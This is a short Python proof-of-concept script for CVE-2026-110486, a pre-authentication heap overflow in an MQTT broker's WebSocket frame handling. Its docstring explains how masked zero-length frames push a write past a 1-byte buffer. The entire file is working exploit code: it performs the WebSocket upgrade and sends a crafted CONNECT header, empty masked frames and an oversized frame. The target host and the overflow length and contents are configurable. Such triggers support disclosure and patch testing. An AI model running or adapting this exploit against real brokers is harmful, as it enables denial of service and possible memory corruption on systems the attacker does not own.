#!/usr/bin/env python3
"""CVE-2026-110486 / MASKerade minimal trigger. Loopback only.

Three legal WebSocket frames, pre-auth, before one MQTT packet completes:
  1. MQTT CONNECT fixed header, Remaining Length 1, body withheld
  2. masked zero-length frame -> net__read_ws() returns 4, copies 0
  3. 256-byte frame written at payload+4, past the 1-byte allocation
"""
import argparse
import socket
import struct
import time

MASK = b"\x11\x22\x33\x44"


def masked_frame(opcode, payload):
    n = len(payload)
    if n < 126:
        hdr = bytes((0x80 | opcode, 0x80 | n))
    elif n < 65536:
        hdr = bytes((0x80 | opcode, 0xFE)) + struct.pack("!H", n)
    else:
        hdr = bytes((0x80 | opcode, 0xFF)) + struct.pack("!Q", n)
    body = bytes(b ^ MASK[i % 4] for i, b in enumerate(payload))
    return hdr + MASK + body


def handshake(sock, host, port):
    req = (
        f"GET /mqtt HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "Sec-WebSocket-Protocol: mqtt\r\n"
        "\r\n"
    ).encode()
    sock.sendall(req)
    sock.settimeout(3)
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--delay", type=float, default=0.25)
    ap.add_argument("--empty", type=int, default=1,
                    help="masked empty frames (each advances pos by 4)")
    ap.add_argument("--write-len", type=int, default=256)
    ap.add_argument("--fill", default="41", help="hex byte for the final write")
    a = ap.parse_args()

    s = socket.create_connection((a.host, a.port), timeout=5)
    hs = handshake(s, a.host, a.port)
    print("handshake:", hs.split(b"\r\n")[0].decode(errors="replace"))
    if b"101" not in hs.split(b"\r\n")[0]:
        print("UPGRADE FAILED; full response:", repr(hs[:300]))
        s.close()
        return

    time.sleep(a.delay)
    s.sendall(masked_frame(0x82, b"\x10\x01"))  # CONNECT, Remaining Length 1
    time.sleep(a.delay)
    s.sendall(masked_frame(0x82, b"") * a.empty)  # phantom 4 bytes each
    time.sleep(a.delay)
    s.sendall(masked_frame(0x82, bytes.fromhex(a.fill) * a.write_len))
    time.sleep(a.delay)

    s.settimeout(2)
    try:
        r = s.recv(4096)
        print("post-trigger recv:", repr(r[:80]))
    except Exception as e:
        print("post-trigger recv exception:", type(e).__name__, str(e))
    s.close()
    print("trigger sent")


if __name__ == "__main__":
    main()
